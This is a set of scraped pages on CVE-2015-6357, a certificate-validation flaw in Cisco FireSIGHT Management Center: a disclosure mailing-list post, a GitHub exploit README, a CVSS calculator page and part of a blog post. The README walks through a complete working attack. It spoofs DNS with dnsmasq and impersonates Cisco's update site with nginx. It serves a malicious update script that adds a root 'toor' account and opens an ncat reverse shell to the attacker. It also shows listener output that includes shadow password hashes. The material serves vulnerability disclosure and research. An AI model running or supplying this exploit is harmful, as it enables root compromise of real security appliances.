=== Content from seclists.org_7a67a87d_20250125_072853.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](78)
[By Date](date.html#79)
[![Next](/images/right-icon-16x16.png)](80)

[![Previous](/images/left-icon-16x16.png)](78)
[By Thread](index.html#79)
[![Next](/images/right-icon-16x16.png)](80)

![](/shared/images/nst-icons.svg#search)

# CVE-2015-6357: Cisco FireSIGHT Management Center SSL Validation Vulnerability

---

*From*: Matthew Flanagan <mattimustang () gmail com>

*Date*: Mon, 16 Nov 2015 21:41:30 +1100

---

```
Title: Cisco FireSIGHT Management Center Certificate Validation
Vulnerability

Blog URL:
<http://wadofstuff.blogspot.com.au/2015/11/cve-2015-6357-firepwner-exploit-for.html>
Vendor: Cisco
Product: FireSIGHT Management Center
Affected Versions: 5.2.x, 5.3.x, 5.4.x
Advisory URL:
<http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc>
CVE: CVE-2015-6357
CVSS: 5.1

The Cisco FireSIGHT Management Center appliance is used to manage Cisco
FirePOWER Intrusion Prevention Systems (IPS), also known as Sourcefire IPS.
FireSIGHT is responsible for downloading updated IPS signatures and
installing
them on managed IPS devices.

On its own the Cisco FireSIGHT Management Center Certificate Validation
Vulnerability is a medium severity vulnerability with a CVSS of 5.1.
However, this vulnerability is an example of why SSL certificate validation
is so
important. In this exploit I will demonstrate how the vulnerability can be
leveraged
to obtain privileged remote command execution on a Cisco FireSIGHT system.
The
exploit chains the SSL validation vulnerability with the software update
process
on the Cisco FireSIGHT system to trick the target system into downloading a
malicious
update and executing it to obtain a reverse shell with **root** privileges.

Read the full advisory at
<http://wadofstuff.blogspot.com.au/2015/11/cve-2015-6357-firepwner-exploit-for.html>

Credits:

This security vulnerability was found by Matthew Flanagan.

Disclosure Timeline:

- 2015-08-31 Vulnerability discovered in FireSIGHT 5.4.x and exploit
developed
  by Matthew Flanagan.
- 2015-09-01 Initial contact made with Cisco PSIRT psirt () cisco com.
- 2015-09-01 PSIRT responded asking for more information.
- 2015-09-01 Matthew Flanagan provided PSIRT with full write up and exploit
of vulnerability.
- 2015-09-02 PSIRT raised FireSIGHT defect and incident PSIRT-190974966.
- 2015-09-15 Matthew Flanagan reported to Cisco PSIRT that versions 5.2.0
and 5.3.0 are also
vulnerable.
- 2015-10-16 PSIRT advised me of the CVSS score they assigned to the
vulnerability.
- 2015-11-09 PSIRT assigned CVE ID CVE-2015-6357.
- 2015-11-16 [Cisco FireSIGHT Management Center Certificate Validation
  Vulnerability][3] published.
- 2015-11-16 Matthew Flanagan's findings published.

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](78)
[By Date](date.html#79)
[![Next](/images/right-icon-16x16.png)](80)

[![Previous](/images/left-icon-16x16.png)](78)
[By Thread](index.html#79)
[![Next](/images/right-icon-16x16.png)](80)

### Current thread:

* **CVE-2015-6357: Cisco FireSIGHT Management Center SSL Validation Vulnerability** *Matthew Flanagan (Nov 17)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from github.com_74acd0f1_20250126_071546.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmattimustang%2Ffirepwner)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmattimustang%2Ffirepwner)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=mattimustang%2Ffirepwner)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mattimustang](/mattimustang)
/
**[firepwner](/mattimustang/firepwner)**
Public

* [Notifications](/login?return_to=%2Fmattimustang%2Ffirepwner) You must be signed in to change notification settings
* [Fork
  5](/login?return_to=%2Fmattimustang%2Ffirepwner)
* [Star
   6](/login?return_to=%2Fmattimustang%2Ffirepwner)

Exploit for CVE-2015-6357 Cisco FireSIGHT Management Center Certificate Validation Vulnerability

[6
stars](/mattimustang/firepwner/stargazers) [5
forks](/mattimustang/firepwner/forks) [Branches](/mattimustang/firepwner/branches) [Tags](/mattimustang/firepwner/tags) [Activity](/mattimustang/firepwner/activity)
 [Star](/login?return_to=%2Fmattimustang%2Ffirepwner)

 [Notifications](/login?return_to=%2Fmattimustang%2Ffirepwner) You must be signed in to change notification settings

* [Code](/mattimustang/firepwner)
* [Issues
  0](/mattimustang/firepwner/issues)
* [Pull requests
  0](/mattimustang/firepwner/pulls)
* [Actions](/mattimustang/firepwner/actions)
* [Projects
  0](/mattimustang/firepwner/projects)
* [Wiki](/mattimustang/firepwner/wiki)
* [Security](/mattimustang/firepwner/security)
* [Insights](/mattimustang/firepwner/pulse)

Additional navigation options

* [Code](/mattimustang/firepwner)
* [Issues](/mattimustang/firepwner/issues)
* [Pull requests](/mattimustang/firepwner/pulls)
* [Actions](/mattimustang/firepwner/actions)
* [Projects](/mattimustang/firepwner/projects)
* [Wiki](/mattimustang/firepwner/wiki)
* [Security](/mattimustang/firepwner/security)
* [Insights](/mattimustang/firepwner/pulse)

# mattimustang/firepwner

    master[Branches](/mattimustang/firepwner/branches)[Tags](/mattimustang/firepwner/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[1 Commit](/mattimustang/firepwner/commits/master/) | | |
| [dnsmasq](/mattimustang/firepwner/tree/master/dnsmasq "dnsmasq") | | [dnsmasq](/mattimustang/firepwner/tree/master/dnsmasq "dnsmasq") |  |  |
| [nginx](/mattimustang/firepwner/tree/master/nginx "nginx") | | [nginx](/mattimustang/firepwner/tree/master/nginx "nginx") |  |  |
| [README.md](/mattimustang/firepwner/blob/master/README.md "README.md") | | [README.md](/mattimustang/firepwner/blob/master/README.md "README.md") |  |  |
| [firepwner.sh](/mattimustang/firepwner/blob/master/firepwner.sh "firepwner.sh") | | [firepwner.sh](/mattimustang/firepwner/blob/master/firepwner.sh "firepwner.sh") |  |  |
| [sf.xml](/mattimustang/firepwner/blob/master/sf.xml "sf.xml") | | [sf.xml](/mattimustang/firepwner/blob/master/sf.xml "sf.xml") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2015-6357: FirePWNER Exploit for Cisco FireSIGHT Management Center SSL Validation Vulnerability

## Introduction

On its own the [Cisco FireSIGHT Management Center Certificate Validation
Vulnerability](http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc "Cisco FireSIGHT Management Center Certificate Validation Vulnerability") is a **medium** severity vulnerability with a **CVSS** of **5.1**.
However, this vulnerability is an example of why SSL certificate validation is so
important. In this exploit I will demonstrate how the vulnerability can be leveraged
to obtain privileged remote command execution on a Cisco FireSIGHT system. The
exploit chains the SSL validation vulnerability with the software update process
on the Cisco FireSIGHT system to trick the target system into downloading a malicious
update and executing it to obtain a reverse shell with **root** privileges.

[![AND THAT'S WHY YOU SHOULD ALWAYS VALIDATE SSL CERTIFICATES](https://camo.githubusercontent.com/3959272fe0ed176848d34c104f0a35e7b00ca404d2e85d000785b91028378acc/68747470733a2f2f692e696d67666c69702e636f6d2f753630776d2e6a7067)](https://camo.githubusercontent.com/3959272fe0ed176848d34c104f0a35e7b00ca404d2e85d000785b91028378acc/68747470733a2f2f692e696d67666c69702e636f6d2f753630776d2e6a7067)

## The Vulnerability

The Cisco FireSIGHT Management Center appliance is used to manage Cisco
FirePOWER Intrusion Prevention Systems (IPS), also known as Sourcefire IPS.
FireSIGHT is responsible for downloading updated IPS signatures and installing
them on managed IPS devices.

The FireSIGHT Management Center allows an administrator to manually initiate an
update of the IPS rules or schedule the updates to occur daily/weekly/monthly.

When the FireSIGHT Management Center performs an update it uses the `curl` UNIX
command to perform the download from [Sourcefire Support](https://support.sourcefire.com "Sourcefire support"). The
invocation of the `curl` command is passed the `-k` (aka `--insecure`) option
which tells `curl` to not validate any SSL certificates presented by the server.

Here is the the `ps` output of the server downloading an update:

```
admin@FIRESIGHT01:/var/sf$ ps -auxwww | grep curl
root      8351  0.0  0.0  37396  2708 ?        S    02:02   0:00 /usr/local/bin/curl -k -o /var/sf/updates/Sourcefire_Geodb_Update-2015-08-17-002.sh https://support.sourcefire.com/auto-update/auto-dl.cgi/XX:XX:XX:XX:XX:XX:XX/Download/files/Sourcefire_Geodb_Update-2015-08-17-002.sh

```

FireSIGHT updates come in the form of a [makeself](https://github.com/megastep/makeself "makeself") generated shell script
that contains both UNIX Bourne shell commands as well as the binary data
to be delivered in the update. These shell update shell scripts are executed
directly on the FireSIGHT server as the local `www` user.

An attacker that is able to perform a man in the middle attack against
a FireSIGHT server can force it to connect to a spoofed version of the
[Sourcefire Support](https://support.sourcefire.com "Sourcefire support") web site and download a malicious update script that
will execute any command the attacker wishes on the FireSIGHT server.

The SSL Validation vulnerability enables this to occur resulting in the system
happily ignoring the attackers spoofed SSL certificate and downloading the
malicious update and executing it.

If the `curl` command were to validate the SSL certificate then it would fail
to download the malicious script and protect the FireSIGHT server from the
attacker.

This exploit demonstrates the danger of not validating the SSL certificate
by exploiting the vulnerability to gain remote command execution as the root
user.

## The Attack Scenario

The attack scenario is one where an attacker has attained the ability to man in
the middle the traffic from the FireSIGHT server to the
<https://support.sourcefire.com> web site. The simplest way to demonstrate this
is to set up a "compromised" DNS server that responds to queries for the domain
`support.sourcefire.com` with the IP address of a web server that the attacker
controls.

In a real attack scenario the attacker may use any number of man in the middle
techniques to acheive the same means. Such as:

* DNS cache poisioning
* ARP spoofing. e.g ettercap.

This exploit was tested against the following FireSIGHT Virtual Appliance versions:

* 5.2.0
* 5.3.0
* 5.4.0
* 5.4.1.1
* 5.4.1.2

In the PoC below the FireSIGHT server was assigned the IP address `192.168.1.99`.

The attacking host was running Kali Linux 2.0 though the set up below
should work on any Debian Linux based server. The IP address of the Kali host
in the example below is `192.168.1.1`. The Kali host is used to run the DNS server
as well as the spoofed [Sourcefire Support](https://support.sourcefire.com "Sourcefire support") web site.

## Set up dnsmasq

The exploit requires the ability to spoof the DNS response for
`support.sourcefire.com`. A dnsmasq server is run to provide this capability and
act as the "compromised" DNS server.

Install dnsmasq:

```
root@kali# apt-get install dnsmasq

```

Configure dnsmasq:

```
root@kali# cat << EOF > /etc/dnsmasq.d/firepnwer.conf
address=/support.sourcefire.com/192.168.1.1
server=8.8.8.8
EOF

```

Edit the IP address on the `address` line to be the address
of the web server you will serve the updates from.

Start dnsmasq:

```
root@kali# service dnsmasq start

```

## Set up nginx

A web server is required to serve the exploit to the FireSIGHT server when it
requests an update.

Install nginx web server:

```
root@kali# apt-get install nginx

```

Create a self signed certificate to impersonate `support.sourcefire.com`:

```
root@kali# mkdir /etc/nginx/ssl

root@kali# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/nginx/ssl/nginx.key \
 -out /etc/nginx/ssl/nginx.crt

Country Name (2 letter code) [AU]:AU
State or Province Name (full name) [Some-State]:New South Wales
Locality Name (eg, city) []:Newcastle
Organization Name (eg, company) [Internet Widgits Pty Ltd]:FirePWNER Exploit.
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:support.sourcefire.com
Email Address []:

```

Configure nginx by replacing the contents of
`/etc/nginx/sites-available/default` with:

```
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    listen 443 ssl;

    root /var/www/html;

    index index.html index.htm index.nginx-debian.html;

    server_name support.sourcefire.com;
    ssl_certificate /etc/nginx/ssl/nginx.crt;
    ssl_certificate_key /etc/nginx/ssl/nginx.key;

    location / {
        try_files $uri $uri/ =404;
    }

    # rewrite requests that contain the clients license key
    location ~* /auto-update/auto-dl.cgi/[A-F0-9][A-F0-9]:.* {
        rewrite ^(/auto-update/auto-dl.cgi)/[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]/(.*)$ $1/$2;
    }

    location /auto-update {
        root /var/www/html/firepwner;
    }

}

```

Start nginx:

```
root@kali# service nginx start

```

## Setting up the exploit

The FirePWNER exploit requires two files to be served from the web server. The
first file is the update manifest which is an XML file that contains a list of
the updates available, their download location and MD5 hashes.

First you need to create some directories:

```
root@kali# mkdir \
    /var/www/html/firepwner/auto-update/auto-dl.cgi/{Download/files,GetCurrent}

```

Then copy the exploit files into them:

```
root@kali# cp sf.xml /var/www/html/firepwner/auto-update/auto-dl.cgi/GetCurrent/sf.xml
root@kali# cp firepwner.sh \
    /var/www/html/firepwner/auto-update/auto-dl.cgi/Download/files/firepwner.sh

```

After copying these files you should be able to browse to
`http://192.168.1.1/auto-update/auto-dl.cgi/GetCurrent/sf.xml`

## Configure the FireSIGHT server DNS

Next, for exploit demonstration purposes, the FireSIGHT server needs to be configured to
use the "compromised" DNS server. Login to the FireSIGHT web portal and go to
`System > Local > Configure > Management Interfaces` and set the Primary DNS server to
the IP address of the "compromised" DNS server (192.168.1.1) and save the change.

## Running the Exploit

The exploit uses the `ncat` command installed by default on the FireSIGHT
server to create a reverse shell to the Kali host. On the Kali host you need to
listen for the reverse shell connection from the FireSIGHT server:

```
root@kali# ncat -v -l 4444

```

Then on the FireSIGHT web portal browse to `System > Updates > Rule Updates`
and select `Download new rule update from the Support Site` and click the
`Import` button. The server will then download the `sf.xml` update manifest from
the attacker's server, see that there is an update available and will
download the update and execute it as the `www` user. The update/exploit script
below takes advantage of the fact that the `www` user has a number of `sudo` commands
it can run including `useradd`. The exploit creates a new `toor` user with an
empty passwd and then uses `su` to elevate privileges and start a reverse shell
connection back to the attackers server.

```
#!/bin/sh
# add a new UID 0 "toor" user with an empty password
sudo useradd -o -p '$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.' -g root -c toor -u 0 -s /bin/sh \
 -d /root toor
# su to toor and start the reverse shell
echo | su - toor -c "/usr/local/sf/nmap/bin/ncat -e /bin/sh support.sourcefire.com 4444"
exit 0

```

The exploit script may be changed to run any other desired commands. If the
script is changed then the `<md5sum>` XML tag value in `sf.xml` must be updated
with the new MD5 hash of the exploit script.

This is an example of the output you should see on the Kali host when the
exploit is successful and a remote shell on the FireSIGHT server is opened and
the `id` and `cat /etc/passwd` commands are run:

```
root@kali# ncat -v -l 4444
Ncat: Version 6.49BETA4 ( http://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.1.99.
Ncat: Connection from 192.168.1.99:41637.
id
uid=0(root) gid=0(root) groups=0(root)
cat /etc/shadow
root:x:11869:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
mysql:*:9797:0:::::
nobody:*:9797:0:::::
sshd:*:9797:0:::::
www:*:9797:0:::::
sfsnort:*:9797:0:::::
sfremediation:*:9797:0:::::
sfrna:*:9797:0:::::
snorty:*:9797:0:::::
admin:$6$GCOeXpyR$Qhq6Eq5aSW8n.15RajwYrHVLud8NaN4aKEkVXC43I5m/X.ux/bgIHAplYifOaxTIxaIThqOBGmZgO5aey5tjE/:11869:0:::::
toor:$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.:16679:0:99999:7:::

```

## Obtaining the Exploit

The files used in this exploit may be obtained from [github](https://github.com/mattimustang/firepwner).

## Disclosure Timeline

* 2015-08-31 Vulnerability discovered in FireSIGHT 5.4.x and exploit developed
  by Matthew Flanagan.
* 2015-09-01 Initial contact made with Cisco PSIRT psirt@cisco.com.
* 2015-09-01 PSIRT responded asking for more information.
* 2015-09-01 Matthew Flanagan provided PSIRT with full write up and exploit of vulnerability.
* 2015-09-02 PSIRT raised FireSIGHT defect and incident PSIRT-190974966.
* 2015-09-15 Matthew Flanagan reported to Cisco PSIRT that versions 5.2.0 and 5.3.0 are also
  vulnerable.
* 2015-10-16 PSIRT advised me of the CVSS score they assigned to the vulnerability.
* 2015-11-09 PSIRT assigned CVE ID CVE-2015-6357.
* 2015-11-16 [Cisco FireSIGHT Management Center Certificate Validation
  Vulnerability](http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc "Cisco FireSIGHT Management Center Certificate Validation Vulnerability") published.
* 2015-11-16 Matthew Flanagan's findings published.

## About

Exploit for CVE-2015-6357 Cisco FireSIGHT Management Center Certificate Validation Vulnerability

### Resources

[Readme](#readme-ov-file)

[Activity](/mattimustang/firepwner/activity)
### Stars

[**6**
stars](/mattimustang/firepwner/stargazers)
### Watchers

[**2**
watching](/mattimustang/firepwner/watchers)
### Forks

[**5**
forks](/mattimustang/firepwner/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fmattimustang%2Ffirepwner&report=mattimustang+%28user%29)

## [Releases](/mattimustang/firepwner/releases)

No releases published

## [Packages 0](/users/mattimustang/packages?repo_name=firepwner)

No packages published

## Languages

* [Shell
  100.0%](/mattimustang/firepwner/search?l=shell)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from sec.cloudapps.cisco.com_9c3e0f2e_20250126_071550.html ===


[Home](http://www.cisco.com) / [Cisco Security](https://sec.cloudapps.cisco.com/security/center/home.x) / [Latest Threat Information](https://sec.cloudapps.cisco.com/security/center/navigation.x?i=118)
#### Cisco Security

# Common Vulnerability Scoring System

| Choose the version of CVSS calculator:   Version 1  Version 2  Version 3  Version 3.1 |
| --- |
| Common Vulnerability Scoring System (CVSS) Online Calculator, version 2.0 |
| Vector: AV:N/AC:H/Au:N/C:P/I:P/A:P/E:F/RL:U/RC:C/CDP:ND/TD:ND/CR:ND/IR:ND/AR:ND |
| This tool is used to calculate a specific threat/vulnerability's CVSS score. Please select the appropriate options below, click "Calculate Score," and the CVSS score will be displayed. Use of this calculator is subject to [the disclaimer below.](#disclaimer) |
| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Access Vector AV: Local AV: Adjacent Network AV: Network  Access Complexity AC: High AC: Medium AC: Low  Authentication Au: Multiple Au: Single Au: None  Confidentiality Impact C: None C: Partial C: Complete  Integrity Impact I: None I: Partial I: Complete  Availability Impact A: None A: Partial A: Complete     Base Score: 5.1 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploitability E: Unproven  E: Proof-of-Concept  E: Functional  E: High  E: Not Defined   **Exploitability**  ---   Unproven (U) No exploit code is available, or an exploit is entirely theoretical. Proof-of-Concept (POC) Proof-of-concept exploit code or an attack demonstration that is not practical for most systems is available. The code or technique is not functional in all situations and may require substantial modification by a skilled attacker.  Functional (F) Functional exploit code is available. The code works in most situations where the vulnerability exists.  High (H) Either the vulnerability is exploitable by functional mobile autonomous code, or no exploit is required (manual trigger) and details are widely available. The code works in every situation, or is actively being delivered via a mobile autonomous agent (such as a worm or virus).  Not Defined (ND) Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   **Remediation Level**  ---   Official Fix (OF)  A complete vendor solution is available. Either the vendor has issued an official patch, or an upgrade is available. Temporary Fix (TF) There is an official but temporary fix available. This includes instances where the vendor issues a temporary hotfix, tool, or workaround.  Workaround (W)  There is an unofficial, non-vendor solution available. In some cases, users of the affected technology will create a patch of their own or provide steps to work around or otherwise mitigate the vulnerability.  Unavailable (U)  There is either no solution available or it is impossible to apply.  Not Defined (ND)  Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.  Report Confidence RC: Unconfirmed  RC: Uncorroborated  RC: Confirmed  RC: Not Defined   **Report Confidence**  ---   Unconfirmed (UC) There is a single unconfirmed source or possibly multiple conflicting reports. There is little confidence in the validity of the reports. An example is a rumor that surfaces from the hacker underground. Uncorroborated (UR) There are multiple non-official sources, possibly including independent security companies or research organizations. At this point there may be conflicting technical details or some other lingering ambiguity.  Confirmed (C) The vulnerability has been acknowledged by the vendor or author of the affected technology. The vulnerability may also be ?Confirmed? when its existence is confirmed from an external event such as publication of functional or proof-of-concept exploit code or widespread exploitation.  Not Defined (ND) Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.     Temporal Score: 4.8 |

| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Collateral Damage Potential CDP: None  CDP: Low  CDP: Low-Medium  CDP: Medium-High  CDP: High  CDP: Not Defined   Target Distribution TD: None  TD: Low  TD: Medium  TD: High  TD: Not Defined   Confidentiality Requirement CR: Not Defined  CR: Low  CR: Medium  CR: High   Integrity Requirement IR: Not Defined  IR: Low  IR: Medium  IR: High   Availability Requirement AR: Not Defined  AR: Low  AR: Medium  AR: High      Environmental Score: 4.8 |

| --- |
|  |
|

![](https://www.static-cisco.com/web/fw/search//img/loader.gif)

Loading..

### Tools

* [Cisco Software Checker](/security/center/softwarechecker.x)
* [Cisco Vulnerability Repository](/security/center/cvr)
* [Bug Search](https://bst.cloudapps.cisco.com/bugsearch/)
* [Cisco PSIRT openVuln API](https://developer.cisco.com/psirt/)
* [CVRF Repository](/security/center/cvrfListing.x)
* [OVAL Repository](https://community.cisco.com/t5/services-blogs/update-regarding-oval-definitions-by-cisco/ba-p/3661030)

### Actions

* [Download Cisco Software](https://software.cisco.com/download/home)
* [Download Snort Rules](https://snort.org)
* [Open or Query a TAC Case](https://mycase.cloudapps.cisco.com/case)

### Related Links

* [Cisco Event Responses](/security/center/erp.x?i=52)
* [Cisco Policies and Processes](/security/center/securityResources.x)
* [Cisco Security Blog](https://blogs.cisco.com/security)
* [Security Solutions](https://www.cisco.com/site/us/en/products/security/index.html)

| --- |
| --- |
| **ENDORSEMENT**  Cisco endorses and subscribes to the vulnerability guidelines outlined by the National Infrastructure Advisory Council (NIAC). The NIAC commissioned the development of the Common Vulnerability Scoring System (CVSS), which is currently maintained by FIRST (Forum of Incident Response and Security Teams), www.first.org, and was a combined effort involving many companies, including Cisco Systems, Inc.  **GENERAL DISCLAIMER AND LIMITATION OF LIABILITY**  All information provided by the CVSS Online Calculator is for informational purposes only and is subject to change or withdrawal at any time without notice. The CVSS Online Calculator is a pilot program and Cisco assumes no responsibility for the accuracy or completeness of the information provided and any decision made or action taken or not taken in reliance upon the information provided or furnished hereunder. The information and results provided by the CVSS Online Calculator vary based on the information provided by each user, which is specific to each user's network and cannot be verified or confirmed by Cisco. The CVSS Online Calculator is offered only as a convenience and any use of the results or information provided is at the user's risk. |



=== Content from wadofstuff.blogspot.com_d0823dd5_20250126_071548.html ===


# Wad of Stuff

IT infrastructure automation, security research, tools, tips and tricks.

## Monday, 16 November 2015

### [CVE-2015-6357: FirePWNER Exploit for Cisco FireSIGHT Management Center SSL Validation Vulnerability](https://wadofstuff.blogspot.com/2015/11/cve-2015-6357-firepwner-exploit-for.html)

## Introduction

On its own the [Cisco FireSIGHT Management Center Certificate Validation
Vulnerability](http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc "Cisco FireSIGHT Management Center Certificate Validation Vulnerability") is a **medium** severity vulnerability with a **CVSS** of **5.1**.
However, this vulnerability is an example of why SSL certificate validation is so
important. In this exploit I will demonstrate how the vulnerability can be leveraged
to obtain privileged remote command execution on a Cisco FireSIGHT system. The
exploit chains the SSL validation vulnerability with the software update process
on the Cisco FireSIGHT system to trick the target system into downloading a malicious
update and executing it to obtain a reverse shell with **root** privileges.

![AND THAT'S WHY YOU SHOULD ALWAYS VALIDATE SSL CERTIFICATES](https://i.imgflip.com/u60wm.jpg)

## The Vulnerability

The Cisco FireSIGHT Management Center appliance is used to manage Cisco
FirePOWER Intrusion Prevention Systems (IPS), also known as Sourcefire IPS.
FireSIGHT is responsible for downloading updated IPS signatures and installing
them on managed IPS devices.

The FireSIGHT Management Center allows an administrator to manually initiate an
